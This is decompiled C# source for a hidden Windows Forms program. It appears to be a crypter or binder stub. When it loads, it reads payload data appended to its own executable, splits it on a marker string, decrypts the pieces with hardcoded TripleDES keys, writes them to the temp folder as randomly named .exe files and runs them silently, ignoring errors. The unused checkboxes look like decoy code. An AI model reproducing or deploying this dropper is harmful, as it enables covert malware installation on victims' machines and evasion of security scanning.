using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace AMGWUTISTHIS;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("CheckBox3")]
	private CheckBox _CheckBox3;

	[AccessedThroughProperty("CheckBox4")]
	private CheckBox _CheckBox4;

	[AccessedThroughProperty("CheckBox5")]
	private CheckBox _CheckBox5;

	private static string resman;

	private static string faith = Path.GetTempPath() + "\\";

	private static string CUTEY = "|LOLPENIS|";

	private readonly byte[] key;

	private readonly byte[] iv;

	private cTripleDES des;

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual CheckBox CheckBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox3 = value;
		}
	}

	internal virtual CheckBox CheckBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox4 = value;
		}
	}

	internal virtual CheckBox CheckBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox5 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		key = new byte[24]
		{
			1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
			11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
			21, 22, 23, 24
		};
		iv = new byte[8] { 8, 7, 6, 5, 4, 3, 2, 1 };
		des = new cTripleDES(key, iv);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		CheckBox1 = new CheckBox();
		CheckBox2 = new CheckBox();
		CheckBox3 = new CheckBox();
		CheckBox4 = new CheckBox();
		CheckBox5 = new CheckBox();
		((Control)this).SuspendLayout();
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		Point location = new Point(-8, 183);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		Size size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(0);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(39, 204);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(81, 17);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(1);
		((ButtonBase)CheckBox2).set_Text("CheckBox2");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox3).set_AutoSize(true);
		CheckBox checkBox5 = CheckBox3;
		location = new Point(47, 212);
		((Control)checkBox5).set_Location(location);
		((Control)CheckBox3).set_Name("CheckBox3");
		CheckBox checkBox6 = CheckBox3;
		size = new Size(81, 17);
		((Control)checkBox6).set_Size(size);
		((Control)CheckBox3).set_TabIndex(2);
		((ButtonBase)CheckBox3).set_Text("CheckBox3");
		((ButtonBase)CheckBox3).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox4).set_AutoSize(true);
		CheckBox checkBox7 = CheckBox4;
		location = new Point(55, 220);
		((Control)checkBox7).set_Location(location);
		((Control)CheckBox4).set_Name("CheckBox4");
		CheckBox checkBox8 = CheckBox4;
		size = new Size(81, 17);
		((Control)checkBox8).set_Size(size);
		((Control)CheckBox4).set_TabIndex(3);
		((ButtonBase)CheckBox4).set_Text("CheckBox4");
		((ButtonBase)CheckBox4).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox5).set_AutoSize(true);
		CheckBox checkBox9 = CheckBox5;
		location = new Point(7, 206);
		((Control)checkBox9).set_Location(location);
		((Control)CheckBox5).set_Name("CheckBox5");
		CheckBox checkBox10 = CheckBox5;
		size = new Size(81, 17);
		((Control)checkBox10).set_Size(size);
		((Control)CheckBox5).set_TabIndex(4);
		((ButtonBase)CheckBox5).set_Text("CheckBox5");
		((ButtonBase)CheckBox5).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)CheckBox5);
		((Control)this).get_Controls().Add((Control)(object)CheckBox4);
		((Control)this).get_Controls().Add((Control)(object)CheckBox3);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private static int RandomNumber(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	private static string RandomString(int size, bool lowerCase)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		checked
		{
			int num = size - 1;
			for (int i = 0; i <= num; i++)
			{
				char value = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
				stringBuilder.Append(value);
			}
			if (lowerCase)
			{
				return stringBuilder.ToString().ToLower();
			}
			return stringBuilder.ToString();
		}
	}

	private static string GetRandom()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(RandomString(4, lowerCase: true));
		stringBuilder.Append(RandomNumber(1000, 9999));
		stringBuilder.Append(RandomString(2, lowerCase: false));
		return stringBuilder.ToString();
	}

	public void two()
	{
		three();
	}

	public void three()
	{
		string text = GetRandom().ToString() + ".exe";
		string[] array = Strings.Split(resman, CUTEY, -1, (CompareMethod)0);
		if (!CheckBox1.get_Checked())
		{
		}
		checked
		{
			int num = Convert.ToInt32(array[2]) + 2;
			int num2 = num;
			for (int i = 3; i <= num2; i++)
			{
				FileSystem.FileOpen(1, faith + i + text, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, des.DEZOR(array[i]), -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				try
				{
					Process.Start(faith + i + text);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			((Form)this).Close();
		}
	}

	public void four()
	{
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
	}

	public void five()
	{
		resman = Strings.Space(checked((int)FileSystem.LOF(1)));
	}

	public void six()
	{
		FileSystem.FileGet(1, ref resman, -1L, false);
	}

	public void SEVENZ()
	{
		FileSystem.FileClose(new int[1] { 1 });
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		four();
		five();
		six();
		SEVENZ();
		two();
	}

	private void checky()
	{
		if (CheckBox1.get_Checked())
		{
			CheckBox2.set_Checked(true);
		}
		else if (!CheckBox3.get_Checked())
		{
			CheckBox3.set_Checked(true);
		}
	}
}
